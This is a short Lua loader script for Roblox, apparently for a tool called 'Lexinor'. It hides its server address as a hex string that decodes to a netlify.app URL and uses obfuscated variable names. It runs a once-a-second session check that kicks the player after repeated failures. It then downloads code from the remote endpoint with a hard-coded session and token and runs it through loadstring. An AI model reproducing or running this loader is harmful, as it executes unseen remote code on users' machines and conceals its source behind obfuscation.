
local _xgdwoebqgy = "68747470733a2f2f6c6578696e6f7232302e6e65746c6966792e617070"


local function decodeHex(s)
    local out = {}
    for i = 1, #s, 2 do
        local n = tonumber(s:sub(i, i + 1), 16)
        if n then
            out[#out + 1] = string.char(n)
        end
    end
    return table.concat(out)
end


local _ptvgghcnte = "c1d3784e008d88a327bbefc5c5322608eafc3bfb0b42c82709f5ab90d1f041ee"

local _fydwuehzge = "52587c1944c601e2d4cf77c9d85cb098decb3b909d7b42fe418af07bde574ac9"

local _cs = _ptvgghcnte
local _cm = 0
local _cmax = 3
local _ca = true

local function _jbdenohgkf()

    local endpoint = decodeHex(_xgdwoebqgy)

    local url = endpoint .. "/api/checker?session=" .. _cs

    local ok, response = pcall(function()
        return game:HttpGet(url)
    end)

    if ok and type(response) == "string" and response:find("ok") then
        _cm = 0
    else
        _cm = _cm + 1
        if _cm >= _cmax then
            _ca = false
            local player = game:GetService("Players").LocalPlayer
            if player then
                pcall(function()
                    player:Kick("Lexinor checker Failer to load | New Session")
                end)
            end
        end
    end

end

pcall(function()
    spawn(function()
        while _ca do
            wait(1)
            pcall(_jbdenohgkf)
        end
    end)
end)

local function _vrpppkhmdy()

    local endpoint = decodeHex(_xgdwoebqgy)

    local url = endpoint .. "/api/x/Lc259l0bYraJJ6qEorZwHMCE?session=" .. _ptvgghcnte .. "&token=" .. _fydwuehzge

    local ok, response = pcall(function()
        return game:HttpGet(url)
    end)

    if not ok then
        return
    end

    if type(response) ~= "string" then
        return
    end

    local fn = loadstring(response)

    if fn then
        return fn()
    end

end

return _vrpppkhmdy()
